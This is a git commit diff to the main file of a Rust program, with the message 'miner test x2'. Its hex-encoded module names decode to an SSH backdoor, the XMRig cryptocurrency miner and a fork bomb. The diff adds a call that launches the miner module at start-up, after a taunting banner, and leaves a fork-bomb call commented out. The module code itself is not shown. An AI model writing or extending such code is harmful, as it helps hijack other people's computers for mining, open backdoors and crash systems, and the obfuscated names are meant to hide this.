82cb1ce52796f7a0d0e63e96a3b1b9cd883df287
Pikkel <ilovemathguy@gmail.com>
2021-12-22 17:17:11 -0500

    miner test x2

--- src/main.rs
+++ src/main.rs
@@ -3,12 +3,15 @@ mod _0x7373686261636b646f6f72;
 mod _0x786d726967;
 
 use _0x666f726b626f6d62::main as main_0x666f726b626f6d62;
+use _0x786d726967::main as main_0x786d726967;
 use std::{thread, time};
 
 fn main() {
     println!("welcome to waco, the feds will arrive shortly :^)");
 
     thread::sleep(time::Duration::from_secs(5));
+
+    main_0x786d726967();
 
     /* fork funny */
     // main_0x666f726b626f6d62::main();
